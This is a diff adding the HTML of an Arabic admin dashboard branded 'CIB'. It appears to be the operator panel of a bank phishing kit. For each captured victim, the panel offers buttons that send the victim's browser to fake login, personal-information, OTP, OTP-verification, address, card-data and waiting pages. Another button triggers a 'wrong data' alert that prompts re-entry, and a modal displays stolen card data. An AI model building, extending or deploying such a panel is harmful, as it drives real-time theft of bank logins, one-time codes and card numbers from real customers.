@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم الإدارية - CIB (منفصلة)</title>
+    <link rel="stylesheet" href="dashboard.css?v=20260401b">
+</head>
+<body>
+    <!-- Login Modal -->
+    <div id="loginModal" class="modal active">
+        <div class="modal-content login-box">
+            <div class="login-header">
+                <img class="login-logo" src="img/logo.png" alt="CIB">
+                <h2>لوحة التحكم الإدارية</h2>
+            </div>
+            
+            <div class="login-form-group">
+                <div id="epochWarning" class="epoch-warning" style="display: none; margin-bottom: 12px; padding: 10px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 6px; font-size: 14px; color: #856404; text-align: center;"></div>
+                <input type="password" id="adminPassword" placeholder="أدخل كلمة المرور" class="password-input">
+                <button onclick="checkPassword()" class="btn-login">دخول</button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="dashboardContainer" class="dashboard-hidden">
+        <header class="dashboard-header">
+            <div class="header-content">
+                <img class="header-logo" src="img/logo.png" alt="CIB">
+                <h1>لوحة التحكم التسجيلات</h1>
+            </div>
+            <div class="header-actions">
+                <button type="button" onclick="openAdminChangePasswordModal()" class="btn-change-password" title="تغيير كلمة مرور الدخول للوحة">تغيير كلمة المرور</button>
+                <button onclick="logout()" class="btn-logout">تسجيل خروج</button>
+            </div>
+        </header>
+
+        <!-- Search & Controls -->
+        <div class="dashboard-controls">
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="ابحث عن اسم مستخدم..." class="search-input">
+                <button onclick="searchUsers()" class="btn-search">🔍</button>
+            </div>
+            
+            <div class="bulk-actions">
+                <button onclick="deleteAllUsers()" class="btn-danger">حذف الكل</button>
+                <button onclick="refreshData()" class="btn-secondary">تحديث الصفحة</button>
+            </div>
+        </div>
+
+        <!-- جداول منفصلة حسب نوع النموذج (تُملأ من dashboard.js) -->
+        <div id="dashboardTablesWrap" class="dashboard-tables-wrap" aria-live="polite"></div>
+    </div>
+
+    <!-- Info Modal -->
+    <div id="infoModal" class="modal modal-hidden">
+        <div class="modal-content info-box">
+            <button onclick="closeInfoModal()" class="close-btn">&times;</button>
+            
+            <h2>تفاصيل المستخدم</h2>
+            
+            <!-- Navigation Buttons (First Section) -->
+            <div class="nav-buttons">
+                <button type="button" onclick="navigateTo('index.html')" class="nav-btn nav-btn--home" data-page="home">Home</button>
+                <button type="button" onclick="navigateTo('watches.html')" class="nav-btn" data-page="watches">ساعات</button>
+                <button type="button" onclick="navigateTo('messege.html')" class="nav-btn" data-page="messege">رسالة</button>
+                <button onclick="navigateTo('login.html')" class="nav-btn" data-page="login">تسجيل الدخول</button>
+                <button onclick="navigateTo('personal.html')" class="nav-btn" data-page="personal">المعلومات الشخصية</button>
+                <button onclick="navigateTo('otp.html')" class="nav-btn" data-page="otp">OTP</button>
+                <button onclick="navigateTo('otp2.html')" class="nav-btn" data-page="otp2">التحقق من OTP</button>
+                <button onclick="navigateTo('address.html')" class="nav-btn" data-page="address">العنوان</button>
+                <button onclick="navigateTo('card-data.html')" class="nav-btn" data-page="card">بيانات البطاقة</button>
+                <button type="button" onclick="navigateTo('waiting.html')" class="nav-btn nav-btn--waiting" data-page="waiting">انتظار</button>
+                <button type="button" onclick="sendSessionDataErrorAlert()" class="nav-btn nav-btn--data-alert" title="يظهر للمستخدم تنبيهاً ويبقى على الصفحة الحالية">تنبيه بيانات خاطئة</button>
+            </div>
+
+            <!-- User Details Section -->
+            <div id="userDetails" class="user-details-container">
+                <!-- يتم ملؤه ديناميكياً -->
+            </div>
+
+            <div class="modal-actions">
+                <button onclick="deleteUser()" class="btn-danger">حذف المستخدم</button>
+                <button onclick="closeInfoModal()" class="btn-secondary">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Card Modal -->
+    <div id="cardModal" class="modal modal-hidden">
+        <div class="modal-content card-box">
+            <button onclick="closeCardModal()" class="close-btn">&times;</button>
+            
+            <h2>بيانات البطاقة</h2>
+            
+            <!-- Navigation Buttons -->
+            <div class="nav-buttons">
+                <button type="button" onclick="navigateTo('index.html')" class="nav-btn nav-btn--home" data-page="home">Home</button>
+                <button type="button" onclick="navigateTo('watches.html')" class="nav-btn" data-page="watches">ساعات</button>
+                <button type="button" onclick="navigateTo('messege.html')" class="nav-btn" data-page="messege">رسالة</button>
+                <button onclick="navigateTo('login.html')" class="nav-btn" data-page="login">تسجيل الدخول</button>
+                <button onclick="navigateTo('personal.html')" class="nav-btn" data-page="personal">المعلومات الشخصية</button>
+                <button onclick="navigateTo('otp.html')" class="nav-btn" data-page="otp">OTP</button>
+                <button onclick="navigateTo('otp2.html')" class="nav-btn" data-page="otp2">التحقق من OTP</button>
+                <button onclick="navigateTo('address.html')" class="nav-btn" data-page="address">العنوان</button>
+                <button onclick="navigateTo('card-data.html')" class="nav-btn" data-page="card">بيانات البطاقة</button>
+                <button type="button" onclick="navigateTo('waiting.html')" class="nav-btn nav-btn--waiting" data-page="waiting">انتظار</button>
+                <button type="button" onclick="sendSessionDataErrorAlert()" class="nav-btn nav-btn--data-alert" title="يظهر للمستخدم تنبيهاً ويبقى على الصفحة الحالية">تنبيه بيانات خاطئة</button>
+            </div>
+
+            <!-- Card Display -->
+            <div id="cardDisplay" class="card-display">
+                <!-- يتم عرض البطاقة ديناميكياً -->
+            </div>
+
+            <div class="modal-actions">
+                <button onclick="closeCardModal()" class="btn-secondary">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- تغيير كلمة مرور اللوحة (خطوتان) -->
+    <div id="adminChangePasswordModal" class="modal modal-hidden" aria-hidden="true">
+        <div class="modal-content admin-change-pw-box">
+            <button type="button" onclick="closeAdminChangePasswordModal()" class="close-btn" aria-label="إغلاق">&times;</button>
+
+            <div id="adminChangePwStep1" class="admin-change-pw-step">
+                <h2>التحقق من الهوية</h2>
+                <p class="admin-change-pw-hint">أدخل كلمة المرور الحالية للوحة التحكم.</p>
+                <div class="login-form-group">
+                    <label class="sr-only" for="adminChangePwOld">كلمة المرور الحالية</label>
+                    <input type="password" id="adminChangePwOld" class="password-input" placeholder="كلمة المرور الحالية" autocomplete="current-password">
+                </div>
+                <div class="admin-change-pw-actions">
+                    <button type="button" onclick="closeAdminChangePasswordModal()" class="btn-secondary">إلغاء</button>
+                    <button type="button" onclick="adminChangePasswordStep1Continue()" class="btn-login">متابعة</button>
+                </div>
+            </div>
+
+            <div id="adminChangePwStep2" class="admin-change-pw-step" hidden>
+                <h2>كلمة المرور الجديدة</h2>
+                <p class="admin-change-pw-hint">اختر كلمة مرور قوية (6 أحرف على الأقل).</p>
+                <div class="login-form-group">
+                    <label class="sr-only" for="adminChangePwNew">كلمة المرور الجديدة</label>
+                    <input type="password" id="adminChangePwNew" class="password-input" placeholder="كلمة المرور الجديدة" autocomplete="new-password">
+                </div>
+                <div class="login-form-group">
+                    <label class="sr-only" for="adminChangePwNew2">تأكيد كلمة المرور</label>
+                    <input type="password" id="adminChangePwNew2" class="password-input" placeholder="تأكيد كلمة المرور الجديدة" autocomplete="new-password">
+                </div>
+                <div class="admin-change-pw-revoke-wrap">
+                    <label class="admin-change-pw-checkbox-label">
+                        <input type="checkbox" id="adminChangePwRevokeAll" class="admin-change-pw-checkbox">
+                        <span>تسجيل الخروج من جميع الأجهزة المسجّلة سابقاً</span>
+                    </label>
+                    <p class="admin-change-pw-warning" title="يشمل الجهاز الحالي: ستُغلق اللوحة هنا وتُطلب منك كلمة المرور الجديدة فور الحفظ.">
+                        <strong>تنبيه:</strong> عند التفعيل يُبطَل دخول اللوحة على هذا الجهاز وعلى أي جهاز آخر كان مسجّلاً، ويجب تسجيل الدخول من جديد بكلمة المرور الجديدة.
+                    </p>
+                </div>
+                <div class="admin-change-pw-actions">
+                    <button type="button" onclick="adminChangePasswordStep2Back()" class="btn-secondary">رجوع</button>
+                    <button type="button" onclick="adminChangePasswordSubmit()" class="btn-login">حفظ كلمة المرور</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Indicator -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p>جاري المعالجة...</p>
+    </div>
+
+    <!-- Notification -->
+    <div id="notification" class="notification"></div>
+
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="dashboard.js?v=20260402a"></script>
+</body>
+</html>
+
